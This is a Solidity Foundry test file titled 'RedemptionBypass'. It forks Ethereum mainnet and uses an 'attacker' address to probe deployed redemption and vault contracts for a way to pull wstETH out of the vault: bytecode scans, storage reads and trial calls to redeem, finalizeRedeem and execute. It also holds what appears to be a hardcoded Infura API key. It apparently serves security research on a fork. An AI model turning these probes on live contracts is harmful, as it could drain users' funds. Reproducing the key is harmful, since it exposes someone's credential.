// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IRedemptionController {
    function redeem(uint256 amount, address to) external;
}

interface IRedemption {
    function redeem(uint96 amount) external;
    function finalizeRedeem(uint256 index) external;
    function cancelRedeem(uint256 index) external;
    function IAU() external view returns (address);
    function VAULT() external view returns (address);
    function REDEMPTION_CONTROLLER() external view returns (address);
    function waitingPeriod() external view returns (uint32);
}

contract RedemptionBypass is Test {
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRedemptionBytecode() public view {
        console.log("=== ANALYZING REDEMPTION BYTECODE ===\n");

        bytes memory code = REDEMPTION_0.code;
        console.log("Redemption 0 code size:", code.length);

        // Count opcodes
        uint256 delegatecallCount = 0;
        uint256 callCount = 0;
        uint256 staticcallCount = 0;
        uint256 calldataloadCount = 0;

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) delegatecallCount++;
            if (uint8(code[i]) == 0xf1) callCount++;
            if (uint8(code[i]) == 0xfa) staticcallCount++;
            if (uint8(code[i]) == 0x35) calldataloadCount++;
        }

        console.log("DELEGATECALL:", delegatecallCount);
        console.log("CALL:", callCount);
        console.log("STATICCALL:", staticcallCount);
        console.log("CALLDATALOAD:", calldataloadCount);

        // Search for function selectors
        console.log("\nSearching for function selectors...");

        bytes4[] memory selectors = new bytes4[](15);
        selectors[0] = bytes4(keccak256("redeem(uint96)"));
        selectors[1] = bytes4(keccak256("finalizeRedeem(uint256)"));
        selectors[2] = bytes4(keccak256("cancelRedeem(uint256)"));
        selectors[3] = bytes4(keccak256("execute(address,bytes)"));
        selectors[4] = bytes4(keccak256("multicall(bytes[])"));
        selectors[5] = bytes4(keccak256("delegatecall(address,bytes)"));
        selectors[6] = bytes4(keccak256("onTokenTransfer(address,uint256,bytes)"));
        selectors[7] = bytes4(keccak256("transferAndCall(address,uint256,bytes)"));
        selectors[8] = bytes4(keccak256("approveAndCall(address,uint256,bytes)"));
        selectors[9] = bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
        selectors[10] = bytes4(keccak256("fallback()"));
        selectors[11] = bytes4(keccak256("receive()"));
        selectors[12] = bytes4(keccak256("rescue(address,address,uint256)"));
        selectors[13] = bytes4(keccak256("sweep(address)"));
        selectors[14] = bytes4(keccak256("updateWaitingPeriod(uint32)"));

        string[15] memory names = [
            "redeem(uint96)",
            "finalizeRedeem(uint256)",
            "cancelRedeem(uint256)",
            "execute",
            "multicall",
            "delegatecall",
            "onTokenTransfer",
            "transferAndCall",
            "approveAndCall",
            "onERC1155Received",
            "fallback",
            "receive",
            "rescue",
            "sweep",
            "updateWaitingPeriod"
        ];

        for (uint s = 0; s < selectors.length; s++) {
            for (uint i = 0; i + 3 < code.length; i++) {
                bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
                if (sel == selectors[s]) {
                    console.log("  Found:", names[s]);
                    console.logBytes4(selectors[s]);
                    break;
                }
            }
        }
    }

    function test_FindRedemptionEntryPoints() public view {
        console.log("=== FINDING REDEMPTION ENTRY POINTS ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Find all PUSH4 followed by EQ (function selector checks)
        console.log("Function selectors in Redemption 0:");

        for (uint i = 0; i + 5 < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 selector = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));

                // Check if followed by EQ within next 10 bytes
                for (uint j = i + 5; j < i + 15 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) { // EQ
                        console.logBytes4(selector);
                        break;
                    }
                }
            }
        }
    }

    function test_TryAllRedemptionFunctions() public {
        console.log("=== TRYING ALL REDEMPTION FUNCTIONS ===\n");

        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBefore / 1e18);

        // Try calling various functions on Redemption
        console.log("\n1. Trying direct redeem(1e18)...");
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1e18))
        );
        console.log("Success:", success);
        if (!success && data.length >= 4) {
            console.log("Error:");
            console.logBytes4(bytes4(data));
        }

        // Try finalizeRedeem with index 0
        console.log("\n2. Trying finalizeRedeem(0)...");
        (success, data) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Success:", success);

        // Try arbitrary data to trigger potential callbacks
        console.log("\n3. Trying onTokenTransfer...");
        (success,) = REDEMPTION_0.call(
            abi.encodeWithSignature(
                "onTokenTransfer(address,uint256,bytes)",
                attacker,
                1e18,
                abi.encode(attacker)
            )
        );
        console.log("Success:", success);

        // Try execute
        console.log("\n4. Trying execute(address,bytes)...");
        (success,) = REDEMPTION_0.call(
            abi.encodeWithSignature(
                "execute(address,bytes)",
                REDEMPTION_CONTROLLER,
                abi.encodeWithSignature("redeem(uint256,address)", 1e18, attacker)
            )
        );
        console.log("Success:", success);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault wstETH after:", vaultAfter / 1e18);
    }

    function test_AnalyzeRedemptionStorage() public view {
        console.log("=== ANALYZING REDEMPTION STORAGE ===\n");

        console.log("Redemption 0 storage slots:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }

        // Check EIP-1967 implementation slot
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 implValue = vm.load(REDEMPTION_0, implSlot);
        console.log("\nImplementation slot:");
        console.logBytes32(implValue);

        if (implValue != bytes32(0)) {
            address impl = address(uint160(uint256(implValue)));
            console.log("Implementation address:", impl);

            // Check if implementation is initializable
            bytes32 initSlot = bytes32(uint256(keccak256("eip1967.proxy.initialized")) - 1);
            bytes32 initValue = vm.load(impl, initSlot);
            console.log("Implementation init status:");
            console.logBytes32(initValue);
        }
    }

    function test_CheckRedemptionDelegatecallTargets() public view {
        console.log("=== CHECKING REDEMPTION DELEGATECALL TARGETS ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Find DELEGATECALL (0xf4) and check what's loaded before it
        console.log("Analyzing DELEGATECALL context...\n");

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) { // DELEGATECALL
                console.log("DELEGATECALL at offset:", i);

                // Look 50 bytes before for PUSH20 (hardcoded address)
                uint256 start = i > 50 ? i - 50 : 0;
                for (uint j = start; j < i; j++) {
                    if (uint8(code[j]) == 0x73) { // PUSH20
                        bytes memory addrBytes = new bytes(20);
                        for (uint k = 0; k < 20 && j + 1 + k < code.length; k++) {
                            addrBytes[k] = code[j + 1 + k];
                        }
                        console.log("  PUSH20 at offset:", j);
                        console.log("  Address:");
                        console.logBytes(addrBytes);
                    }

                    // SLOAD - loading from storage (could be implementation)
                    if (uint8(code[j]) == 0x54) {
                        console.log("  SLOAD at offset:", j);
                    }
                }
            }
        }
    }

    function test_FindCallbacksInRedemption() public view {
        console.log("=== FINDING CALLBACKS IN REDEMPTION ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Look for callback-related selectors
        bytes4[] memory callbackSels = new bytes4[](10);
        callbackSels[0] = bytes4(keccak256("onTokenTransfer(address,uint256,bytes)"));
        callbackSels[1] = bytes4(keccak256("tokensReceived(address,address,address,uint256,bytes,bytes)"));
        callbackSels[2] = bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
        callbackSels[3] = bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
        callbackSels[4] = bytes4(keccak256("onFlashLoan(address,address,uint256,uint256,bytes)"));
        callbackSels[5] = bytes4(keccak256("uniswapV3SwapCallback(int256,int256,bytes)"));
        callbackSels[6] = bytes4(keccak256("receiveFlashLoan(address[],uint256[],uint256[],bytes)"));
        callbackSels[7] = bytes4(keccak256("executeOperation(address,uint256,uint256,address,bytes)"));
        callbackSels[8] = bytes4(keccak256("onTransfer(address,address,uint256)"));
        callbackSels[9] = bytes4(keccak256("afterTokenTransfer(address,address,uint256)"));

        string[10] memory names = [
            "onTokenTransfer",
            "tokensReceived (ERC777)",
            "onERC721Received",
            "onERC1155Received",
            "onFlashLoan",
            "uniswapV3SwapCallback",
            "receiveFlashLoan (Balancer)",
            "executeOperation (Aave)",
            "onTransfer",
            "afterTokenTransfer"
        ];

        console.log("Searching for callback selectors...");

        for (uint s = 0; s < callbackSels.length; s++) {
            for (uint i = 0; i + 3 < code.length; i++) {
                bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
                if (sel == callbackSels[s]) {
                    console.log("  Found:", names[s]);
                    break;
                }
            }
        }
    }

    function test_CheckIAUTokenCallbacks() public view {
        console.log("=== CHECKING IAU TOKEN FOR CALLBACKS ===\n");

        // IAU is the token that users stake to redeem
        // If IAU has transfer hooks (like ERC777), we might be able to use them

        bytes memory code = IAU.code;
        console.log("IAU code size:", code.length);

        // Look for ERC777 hooks
        bytes4 tokensReceivedSel = bytes4(keccak256("tokensReceived(address,address,address,uint256,bytes,bytes)"));
        bytes4 tokensSentSel = bytes4(keccak256("tokensSent(address,address,address,uint256,bytes,bytes)"));

        bool hasTokensReceived = false;
        bool hasTokensSent = false;

        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == tokensReceivedSel) hasTokensReceived = true;
            if (sel == tokensSentSel) hasTokensSent = true;
        }

        console.log("IAU has tokensReceived:", hasTokensReceived);
        console.log("IAU has tokensSent:", hasTokensSent);

        // Check for transferAndCall pattern
        bytes4 transferAndCallSel = bytes4(keccak256("transferAndCall(address,uint256,bytes)"));
        bool hasTransferAndCall = false;

        for (uint i = 0; i + 3 < code.length; i++) {
            bytes4 sel = bytes4(bytes.concat(code[i], code[i+1], code[i+2], code[i+3]));
            if (sel == transferAndCallSel) hasTransferAndCall = true;
        }

        console.log("IAU has transferAndCall:", hasTransferAndCall);

        // Count DELEGATECALL - IAU might be a proxy
        uint256 delegatecallCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) delegatecallCount++;
        }
        console.log("IAU DELEGATECALL count:", delegatecallCount);

        // Check proxy status
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 implValue = vm.load(IAU, implSlot);
        if (implValue != bytes32(0)) {
            console.log("IAU is a PROXY! Implementation:");
            console.logBytes32(implValue);
        }
    }

    function test_TryRedeemAndWarp() public {
        console.log("=== TRYING REDEEM AND WARP ===\n");

        // Get some IAU tokens
        address iauHolder = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e; // RC owner might have some
        deal(IAU, attacker, 1000e18);

        vm.startPrank(attacker);

        console.log("Attacker IAU balance:", IERC20(IAU).balanceOf(attacker) / 1e18);

        // Approve Redemption
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // Start redemption
        console.log("\n1. Starting redemption...");
        (bool success, bytes memory data) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("Redeem success:", success);
        if (!success) {
            console.log("Error:");
            if (data.length >= 4) console.logBytes4(bytes4(data));
        }

        // Warp past waiting period
        console.log("\n2. Warping 7 days...");
        vm.warp(block.timestamp + 7 days + 1);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("Vault wstETH before finalize:", vaultBefore / 1e18);

        // Finalize redemption
        console.log("\n3. Finalizing redemption...");
        (success, data) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Finalize success:", success);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("\nVault wstETH after:", vaultAfter / 1e18);
        console.log("Attacker wstETH received:", (attackerAfter - attackerBefore) / 1e18);
    }

    function test_CheckRedemptionIsProxy() public view {
        console.log("=== CHECKING IF REDEMPTION IS A PROXY ===\n");

        // EIP-1967 slots
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
        bytes32 beaconSlot = bytes32(uint256(keccak256("eip1967.proxy.beacon")) - 1);

        bytes32 implValue = vm.load(REDEMPTION_0, implSlot);
        bytes32 adminValue = vm.load(REDEMPTION_0, adminSlot);
        bytes32 beaconValue = vm.load(REDEMPTION_0, beaconSlot);

        console.log("Redemption 0:");
        console.log("  Implementation slot:");
        console.logBytes32(implValue);
        console.log("  Admin slot:");
        console.logBytes32(adminValue);
        console.log("  Beacon slot:");
        console.logBytes32(beaconValue);

        if (implValue != bytes32(0)) {
            address impl = address(uint160(uint256(implValue)));
            console.log("\n  IS PROXY! Implementation:", impl);

            // Check implementation code
            bytes memory implCode = impl.code;
            console.log("  Implementation code size:", implCode.length);

            // Check if implementation is initializable
            bytes32 initSlot = bytes32(0);
            bytes32 initValue = vm.load(impl, initSlot);
            console.log("  Implementation slot 0:");
            console.logBytes32(initValue);
        }

        // Check Redemption 1
        implValue = vm.load(REDEMPTION_1, implSlot);
        if (implValue != bytes32(0)) {
            address impl = address(uint160(uint256(implValue)));
            console.log("\nRedemption 1 IS PROXY! Implementation:", impl);
        }
    }
}
